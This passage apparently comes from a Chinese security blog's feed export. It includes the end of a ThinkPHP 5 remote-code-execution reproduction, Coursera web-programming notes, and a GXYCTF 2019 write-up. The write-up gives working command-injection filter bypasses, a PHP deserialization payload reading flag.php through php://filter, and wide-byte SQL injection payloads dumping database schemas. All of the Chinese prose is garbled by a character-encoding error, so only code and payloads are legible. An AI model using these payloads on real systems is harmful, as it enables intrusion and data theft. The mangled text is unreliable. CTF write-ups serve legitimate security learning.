title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æŸ¥æ‰¾æ‰‹å†Œ,æ‰¾åˆ°urlè®¿é—®çš„å…·ä½“ç»†èŠ‚</p><p><code>http://serverName/index.phpï¼ˆæˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰?s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]</code></p><p>äºæ˜¯æœ‰é€šæ€tp5.0.xå’Œtp5.1.xçš„æ£€æµ‹payload</p><p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/01/28/tp5rceå¤ç°/">http://blog.ccreater.top/2020/01/28/tp5rceå¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>coursera-æœå…‹å¤§å­¦ ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨</title>
      <link href="/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/"/>
      <url>/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="coursera-æœå…‹å¤§å­¦-ç¨‹åºè®¾è®¡ä¸-Web-å…¥é—¨"><a href="#coursera-æœå…‹å¤§å­¦-ç¨‹åºè®¾è®¡ä¸-Web-å…¥é—¨" class="headerlink" title="coursera-æœå…‹å¤§å­¦ ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨"></a>coursera-æœå…‹å¤§å­¦ ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨</h1><h2 id="åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—"><a href="#åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—" class="headerlink" title="åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—"></a>åœ¨courseraä¸Šå­¦ä¹ çš„æ„Ÿå—</h2><p>æˆ‘è§‰å¾—æœ€å¤§çš„ä¼˜ç‚¹æ˜¯:æ•™å­¦å’Œç»ƒä¹ åŒæ—¶è¿›è¡Œ,æå¤§çš„å¸®åŠ©äº†æˆ‘å¿«é€ŸæŒæ¡çŸ¥è¯†,è¿™æ˜¯æˆ‘æœ€å–œæ¬¢çš„ä¸€ç‚¹.ä½†æ˜¯å¯¹äºä¸­å›½å¢ƒå†…çš„è§†é¢‘ åŠ è½½æœ‰ç‚¹éš¾å—,ä¸è¿‡å¯ä»¥é€šè¿‡ä¿®æ”¹hostsæ¥æ”¹å–„.</p><p>è™½ç„¶è¿™ç§æ•™å­¦æ–¹å¼æˆ‘å¾ˆå–œæ¬¢,ä½†æ˜¯ç”±äºæˆ‘çš„è¯¾ç¨‹é€‰æ‹©ä¸å¤ªé€‚åˆæˆ‘è‡ªå·±(å¤ªåŸºç¡€äº†),å¯¼è‡´æˆ‘å…¶å®æ²¡å­¦åˆ°å•¥,ä½†æ˜¯æˆ‘è¿˜æ˜¯ç¡¬ç€å¤´çš®çœ‹å®Œäº†(é—²å¾—æ— èŠ?),é€‰æ‹©é€‚åˆè‡ªå·±çš„è¯¾ç¨‹çœŸçš„ç‰¹åˆ«é‡è¦</p><h2 id="æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹"><a href="#æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹"></a>æé—®é—®é¢˜çš„æ³¨æ„äº‹é¡¹</h2><p><strong>è¯¦ç»†</strong>,<strong>æ¸…æ¥š</strong>çš„æè¿°è‡ªå·±é‡åˆ°çš„é—®é¢˜,åŠè‡ªå·±å°è¯•è§£å†³é—®é¢˜çš„ç»“æœ</p><h2 id="cssè¯­æ³•"><a href="#cssè¯­æ³•" class="headerlink" title="cssè¯­æ³•"></a>cssè¯­æ³•</h2><pre><code class="css">.classname{    preperty:value;}#ID{    preperty:value;}tagname {    preperty:value;};ortag1 tag2 {    preperty:value;};è¿™ä¸ªä¼šä¿®æ”¹tag1ä¸‹çš„tag2</code></pre><h2 id="cssèµ„æ–™"><a href="#cssèµ„æ–™" class="headerlink" title="cssèµ„æ–™"></a>cssèµ„æ–™</h2><h3 id="æ–‡æ¡£"><a href="#æ–‡æ¡£" class="headerlink" title="æ–‡æ¡£"></a>æ–‡æ¡£</h3><p> <a href="https://www.w3schools.com/css/css_border.asp" target="_blank" rel="noopener">https://www.w3schools.com/css/css_border.asp</a> </p><h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a href="https://www.w3schools.com/cssref/css_colors.asp" target="_blank" rel="noopener">https://www.w3schools.com/cssref/css_colors.asp</a> </p><p> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p><p> <a href="http://www.w3schools.com/colors/colors_picker.asp" target="_blank" rel="noopener">http://www.w3schools.com/colors/colors_picker.asp</a></p><h2 id="ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤"><a href="#ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤" class="headerlink" title="ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤"></a>ç”¨ç¼–ç¨‹è§£å†³é—®é¢˜çš„ä¸ƒæ­¥éª¤</h2><ol><li>Work example by hand.<br>æ¸…æ™°çš„è®¤è¯†è¦è§£å†³çš„é—®é¢˜,å¹¶æ‰‹åŠ¨å°è¯•è§£å†³</li><li>Write down what you did.<br>å†™ä¸‹è‡ªå·±è§£å†³é—®é¢˜çš„è¿‡ç¨‹(åªé’ˆå¯¹è¿™ä¸ªå…·ä½“çš„ä¾‹å­),ä¸è¦å¿½ç•¥æˆ‘ä»¬ç†æ‰€å½“ç„¶çš„ä¸œè¥¿,è®¡ç®—æœºä¸ä¼šè¿™ä¹ˆæƒ³,æˆ‘ä»¬è¦å°½å¯èƒ½çš„è¯¦ç»†,ç²¾ç¡®çš„è®°å½•æˆ‘ä»¬è§£å†³é—®é¢˜çš„æ­¥éª¤</li><li>Find patterns.<br>å°†è¿‡ç¨‹æŠ½è±¡æˆè§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€èˆ¬æ€§æ­¥éª¤,æ³¨æ„é‡å¤çš„æ­¥éª¤(å˜ä¸ºå¾ªç¯è¯­å¥),æ³¨æ„åˆ¤æ–­(å˜ä¸ºæ¡ä»¶è¯­å¥)</li><li>Check by hand.<br>ç”¨å…·ä½“çš„ä¾‹å­æ¥æ£€éªŒæŠ½è±¡çš„æ­¥éª¤æ˜¯å¦èƒ½è§£å†³é—®é¢˜</li><li>Translate to code. </li><li>Run test cases. </li><li>Debug failed test cases.<br>ä¸€èˆ¬å¯ä»¥æŠŠé—®é¢˜åˆ†ä¸º:æ­¥éª¤é—®é¢˜(å¦‚æ²¡è€ƒè™‘æŸäº›ç‰¹æ®Šæƒ…å†µ)å’Œå°†æ­¥éª¤è½¬ä¸ºç¨‹åºæ—¶(å¦‚å‡½æ•°ç”¨é”™)çš„é—®é¢˜</li></ol><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="æ‰‹å†Œ"><a href="#æ‰‹å†Œ" class="headerlink" title="æ‰‹å†Œ"></a>æ‰‹å†Œ</h3><p> <a href="https://developer.mozilla.org/" target="_blank" rel="noopener">https://developer.mozilla.org/</a> </p><p> <a href="https://www.w3schools.com/" target="_blank" rel="noopener">https://www.w3schools.com/</a> </p><h3 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h3><pre><code class="javascript">var img = new SimpleImage(200, 200);for(var pixel of img.values()){//pixelæ˜¯img.values()çš„å¼•ç”¨    pixel.setRed(255);    pixel.setGreen(255);    pixel.setBlue(0);}print(img);</code></pre><h3 id="canvasæ“ä½œ"><a href="#canvasæ“ä½œ" class="headerlink" title="canvasæ“ä½œ"></a>canvasæ“ä½œ</h3><pre><code class="javascript">var canvas=document.getElementById(&quot;show2&quot;);var context = canvas.getContext(&#39;2d&#39;);#initcontext.clearRect(0, 0, canvas.width, canvas.height);#clear canvascontext.font = &quot;30px Arial&quot;;context.fillText(&quot;Hello World&quot;, 10, 50);#draw a textcontext.fillStyle = &quot;red&quot;;context.fillRect(10, 10, 150, 80);#draw rectangle</code></pre><h3 id="å˜é‡èµ‹å€¼"><a href="#å˜é‡èµ‹å€¼" class="headerlink" title="å˜é‡èµ‹å€¼"></a>å˜é‡èµ‹å€¼</h3><p>å½“å˜é‡æ˜¯æ•°å­—å’Œå­—ç¬¦ä¸²çš„æ—¶å€™,ä¼šç”Ÿæˆä¸€ä¸ªæ‹·è´,å†èµ‹å€¼ç»™ç›®æ ‡</p><p>ä½†å¦‚æœå¯¹è±¡æ˜¯æ•°ç»„å’Œå¯¹è±¡æ—¶,è¿™ä¼šå°†å¼•ç”¨èµ‹å€¼ç»™ç›®æ ‡,æ­¤æ—¶ä¿®æ”¹æ–°å˜é‡ä¹Ÿä¼šå½±å“åˆ°æ—§å˜é‡</p><h2 id="htmlæ ‡ç­¾"><a href="#htmlæ ‡ç­¾" class="headerlink" title="htmlæ ‡ç­¾"></a>htmlæ ‡ç­¾</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p><h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h3><p>onclick,onchage,oninput</p><h2 id="ç»™è‡ªå·±çš„å»ºè®®"><a href="#ç»™è‡ªå·±çš„å»ºè®®" class="headerlink" title="ç»™è‡ªå·±çš„å»ºè®®"></a>ç»™è‡ªå·±çš„å»ºè®®</h2><blockquote><p>åˆæ ¼çš„ç¨‹åºå‘˜ä¸åº”è¯¥æµªè´¹å¾ˆå¤šæ—¶é—´ç”¨äºç¨‹åºè°ƒè¯•,ä»–ä»¬åº”è¯¥ä¸€å¼€å§‹å°±ä¸è¦æŠŠæ•…éšœå¼•å…¥.</p><p>â€”-è¿ªæ°æ–¯ç‰¹æ‹‰</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p><p>å‘ç°bug-&gt;æ˜ç¡®ç›®çš„(äº†è§£bugå‘ç”Ÿçš„åŸå› åŠè§£å†³æ–¹æ³•)-&gt;æ”¶é›†ä¿¡æ¯-&gt;(å¤šæ¬¡)æå‡ºçŒœæƒ³(where,why)(è¦å…·æœ‰å¯æµ‹è¯•æ€§)-&gt;éªŒè¯-&gt;è§£å†³</p><h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a href="https://codepen.io/explorersss/full/wvBOwmR" target="_blank" rel="noopener">https://codepen.io/explorersss/full/wvBOwmR</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/01/25/coursera-æœå…‹å¤§å­¦">http://blog.ccreater.top/2020/01/25/coursera-æœå…‹å¤§å­¦</a> ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨/](<a href="http://blog.ccreater.top/2020/01/25/coursera-æœå…‹å¤§å­¦">http://blog.ccreater.top/2020/01/25/coursera-æœå…‹å¤§å­¦</a> ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gxytf2019</title>
      <link href="/2019/12/22/gxyctf2019/"/>
      <url>/2019/12/22/gxyctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>è¿‡æ»¤$,â€™ â€˜,</p><p>æœªè¿‡æ»¤ç¬¦å·:<code>!,#,$,%,(,.,+,-,:,;,=</code></p><p>è¿‡æ»¤ç©ºæ ¼ç”¨$IFSæ¥ä»£æ›¿</p><p>è¿‡æ»¤flag</p><p>ç”¨base64æ¥ç»•è¿‡</p><p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p><pre><code class="php">    &lt;?php    if(isset($_GET[&#39;ip&#39;])){        $ip = $_GET[&#39;ip&#39;];        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);            die(&quot;fxck your symbol!&quot;);        }        else if(preg_match(&quot;/ /&quot;, $ip)){            die(&quot;fxck your space!&quot;);        }        else if(preg_match(&quot;/bash/&quot;, $ip)){            die(&quot;fxck your bash!&quot;);        }        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){            die(&quot;fxck your flag!&quot;);        }        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);        echo &quot;&lt;pre&gt;&quot;;        print_r($a);    }    ?&gt;</code></pre><p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>æ²¡åšå‡ºæ¥å¿½ç•¥ä»–</strong></p><p>ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†æŠŠ:æ£€æµ‹åç¼€è¿˜æ˜¯ä¸Šä¼ ç±»å‹?</p><p>Content-Type: image/jpeg,å¯ä»¥ä¸Šä¼ äº†</p><p>ä¸Šä¼ æ–‡ä»¶åæ— æ³•è®¿é—®404</p><p>ä¸Šä¼ æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹å’Œsessionæœ‰å…³</p><p>å°†sessionç½®ç©ºåæŠ¥é”™</p><pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;</code></pre><p>çŒœæµ‹éšæœºç”Ÿæˆä¸€ä¸ªå€¼æ”¾åˆ°sessioné‡Œé¢</p><p>phpç‰ˆæœ¬5.6å¯ä»¥%00æˆªæ–­</p><p>åç¼€ä¸èƒ½ä»¥phç»“å°¾</p><h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote><p>PHP åœ¨ååºåˆ—åŒ– string æ—¶æ²¡æœ‰ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–æ ¼å¼ <code>s:x:&quot;x&quot;;</code>è¿›è¡Œå¤„ç†ï¼Œæ²¡æœ‰å¯¹ <code>&quot;</code>åé¢çš„æ˜¯å¦å­˜åœ¨ <code>;</code> è¿›è¡Œåˆ¤æ–­ï¼ŒåŒæ—¶å¢åŠ äº†å¯¹åå…­è¿›åˆ¶å½¢å¼å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œè¿™æ ·å‰åå¤„ç†çš„ä¸ä¸€è‡´è®©äººå¾ˆè´¹è§£ï¼ŒåŒæ—¶ç”±äº PHP æ‰‹å†Œä¸­å¯¹æ­¤æ²¡æœ‰è¯¦ç»†çš„è¯´æ˜ï¼Œå¤§éƒ¨åˆ†ç¨‹åºå‘˜å¯¹æ­¤å¤„ç†è¿‡ç¨‹å¹¶ä¸äº†è§£ï¼Œè¿™å¯èƒ½å¯¼è‡´å…¶åœ¨ç¼–ç è¿‡ç¨‹ä¸­å‡ºç°ç–æ¼ï¼Œç”šè‡³å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚</p></blockquote><pre><code class="php">&lt;?php class FileReader{    public $Filename;    public $start;    public $max_length;    function __construct(){        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;        $this-&gt;start = 12;        $this-&gt;max_length = 72;    }    function __wakeup(){        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;        $this-&gt;start = 10;        $this-&gt;max_length = 0;        echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;    }    function __destruct(){        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length);        if(preg_match(&quot;/\{|\}/&quot;, $data)){            die(&quot;you can&#39;t read flag!&quot;);        }        else{            echo $data;        }    }}if(isset($_GET[&#39;exp&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;exp&#39;])){        die(&quot;hack!&quot;);    }    $exp = $_REQUEST[&#39;exp&#39;];    $e = unserialize($exp);    echo $e-&gt;Filename;}else{    $exp = new FileReader();}?&gt;</code></pre><p>ä»¤å±æ€§æ•°é‡ä¸å®é™…æ•°é‡ä¸åŒæ¥ç»•è¿‡<code>__wakeup</code></p><p>åˆ©ç”¨16è¿›åˆ¶ç»•è¿‡flagçš„é™åˆ¶</p><p><code>O:10:&quot;FileReader&quot;:4:{s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;}</code></p><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>æ­£åˆ™åŒ¹é…çš„å››<code>$_GET</code>,è€Œä¼ çš„å‚æ•°æ˜¯<code>$_REQUEST</code>,ä»è€Œç»•è¿‡</p><h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select è®¾ç½®è‡ªå·±çš„å¯†ç æ‹¿åˆ°flag</p><h2 id="ç¦æ­¢å¥—å¨ƒ"><a href="#ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="ç¦æ­¢å¥—å¨ƒ"></a>ç¦æ­¢å¥—å¨ƒ</h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>å’Œbytectf2019æœ‰ç‚¹ç±»ä¼¼ <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p><p><code>var_dump(scandir(chr(time())));</code></p><p><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; }</code></p><p>chr,random_bytes</p><p>ç¿»æ•°ç»„ç›¸å…³çš„å‡½æ•°æ‰¾åˆ°array_rand,ä½†æ˜¯é—æ†¾çš„æ˜¯è¿”å›çš„æ˜¯é”®å,å¦‚æœæˆ‘ä»¬èƒ½äº¤æ¢é”®åå’Œå€¼å°±å¯ä»¥æ‹¿åˆ°flag.phpäº†,å†æ‰¾ä¸€æ‰¾å‘ç°array_filp</p><p>æœ€åçš„payload</p><p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p><h3 id="è§£æ³•äºŒ-1"><a href="#è§£æ³•äºŒ-1" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p><code>readfile(session_id(session_start()))</code></p><p>ç„¶å<code>PHPSESSID=flag.php</code>è¯»åˆ°flag</p><h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>æåˆ°ä¸­æ–‡,å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡å¼•å·</p><p>è¿‡æ»¤select,union,whereç­‰</p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p><p>å›æ˜¾å¯†ç </p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p><p>æ•°æ®åº“:<code>information_schema,web_sqli</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p><p>è¡¨:<code>f14g,user</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p><p>åˆ—:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p><p>è¯»å–flag,ä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶</p><p>æœ€åå¾—åˆ°æŠ–è‚©èˆ+flag</p><p>GXY{g0Od_job1im_so_vegetable}</p><h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>å¯¹phpsessionæ³¨å…¥æŠ¥é”™</p><pre><code class="html">&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=uft-8&quot;/&gt;&lt;title&gt;login&lt;/title&gt;&lt;script&gt;alert(&#39;Wrong pass&#39;);location.href=&#39;./index.php&#39;&lt;/script&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;</code></pre><pre><code>[21:19:28] 200 -   89B  - /home.php[21:19:29] 200 -  562B  - /index.php[21:19:35] 200 -  253B  - /upload.php[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/[21:19:35] 403 -  300B  - /uploads/</code></pre><p>fuzzä¸€ä¸‹å‘ç°æ²¡å•¥å¥½æ³¨çš„</p><p>å†ç»“åˆæ‰«åˆ°çš„ä¸œä¸œ,çˆ†ç ´å¾—åˆ°å¯†ç password</p><p>æ–‡ä»¶ä¸Šä¼ æ²¡ç”¨?ä¸Šä¼ åæ²¡æœ‰ä»»ä½•æç¤º</p><p>content-typeæ”¹ä¸ºjpeg,å¯ä»¥ä¸Šä¼ ä½†æ˜¯åç¼€æ˜¯.txt</p><p>å¦‚æœèƒ½æ§åˆ¶åç¼€å°±å¯ä»¥æ–‡ä»¶åŒ…å«äº†å°è¯•æ–‡ä»¶åå¤„%00æˆªæ–­æ— æ•ˆ</p><p>homeå¤„æœ‰æ–‡ä»¶åŒ…å«,ä½†æ˜¯ä¼šå†æœ«å°¾æ·»åŠ .fxxkyou(home.phpå’Œupload.phpä¸ä¼š)</p><p>å› ä¸ºé¢˜ç›®ç¯å¢ƒæ˜¯5.6,å°è¯•%00æˆªæ–­ [ x ]</p><p>è¿™é‡Œæˆ‘å‘ç°æˆ‘å¯¹æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶åŒ…å«éƒ¨åˆ†çš„æŒæ¡ä¸å¥½,ä»¥åŠæ€è€ƒè§£å†³æ–¹æ³•æ—¶å€™çš„æ€è€ƒæ–¹å¼ä¸å¤ªè¡Œ</p><p>è¿™é‡Œåˆ©ç”¨ä¼ªåè®®ç›´æ¥è¯»å–ä»£ç ,ä½†æ˜¯æˆ‘å´ååæ²¡æƒ³åˆ°è¿™ä¹ˆåŸºç¡€çš„ä¸œè¥¿.å›å»é‡æ–°å­¦ä¹ ä¸€ä¸‹æ–‡ä»¶åŒ…å«å’Œä¸Šä¼ </p><p>ä»£ç å®¡è®¡å‘ç°pharååºåˆ—åŒ–å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>å·²è¢«é­”æ”¹</p><p>home.php</p><pre><code class="php">&lt;?phpecho &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_GET[&#39;file&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;hacker!&quot;);    }    else{        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#39;file&#39;])){            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;        }        else{            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        }        echo &quot;å½“å‰å¼•ç”¨ &quot;.$file;        require $file;    }}else{    die(&quot;no permission!&quot;);}?&gt;</code></pre><p>upload.php</p><pre><code class="php">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    ä¸Šä¼     &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;&lt;/form&gt;&lt;?phpclass Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd().&quot;/uploads/&quot;.md5(&quot;admin&quot;).&quot;/&quot;;        $ext = &quot;.txt&quot;;        @mkdir($sandbox, 0777, true);        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){            $this-&gt;Filename = $_GET[&#39;name&#39;];        }        else{            $this-&gt;Filename = $sandbox.&quot;admin&quot;.$ext;        }        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study 